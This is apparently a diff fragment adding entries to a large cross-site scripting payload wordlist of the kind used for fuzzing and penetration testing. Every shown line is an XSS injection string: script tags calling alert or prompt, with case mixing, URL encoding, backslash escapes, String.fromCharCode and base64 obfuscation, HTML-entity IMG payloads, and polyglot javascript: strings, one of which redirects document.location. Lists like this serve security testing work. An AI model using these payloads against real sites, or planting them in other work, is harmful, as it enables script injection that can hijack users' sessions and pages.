+="><script>prompt('XSS')</script>
+="><ScRiPt>PrOmPt('XSS')</ScRiPt>
+="><script>prompt(String.fromCharCode(88, 83, 83)</script>
+="><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><<script>alert('XSS')</script>
+=\\><<ScRiPt>AlErT('XSS')</ScRiPt>
+=\\><<script>alert(String.fromCharCode(88, 83, 83)</script>
+=\\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><<script>prompt('XSS')</script>
+=\\><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\\><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\\><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><script>alert('XSS')</script>
+=\\><ScRiPt>AlErT('XSS')</ScRiPt>
+=\\><script>alert(String.fromCharCode(88, 83, 83)</script>
+=\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><script>prompt('XSS')</script>
+=\\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><<script>alert('XSS')</script>
+=\><<ScRiPt>AlErT('XSS')</ScRiPt>
+=\><<script>alert(String.fromCharCode(88, 83, 83)</script>
+=\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><<script>prompt('XSS')</script>
+=\><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><script>alert('XSS')</script>
+=\><ScRiPt>AlErT('XSS')</ScRiPt>
+=\><script>alert(String.fromCharCode(88, 83, 83)</script>
+=\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><script>prompt('XSS')</script>
+=\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=%3e%3c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>alert('XSS')%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>AlErT('XSS')%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>alert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>AlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>prompt('XSS')%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>PrOmPt('XSS')%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>prompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=><><script>alert('XSS')</script>
+=><><ScRiPt>AlErT('XSS')</ScRiPt>
+=><><script>alert(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=><><script>prompt('XSS')</script>
+=><><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=><><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+a="get";
+alert(a.source)</SCRIPT>
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+getURL("javascript:alert('XSS')")
+Ij48c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0Pg==
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
 javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
@@ -8972,3 +9277,4 @@ javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/a
 javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
 javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
 javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
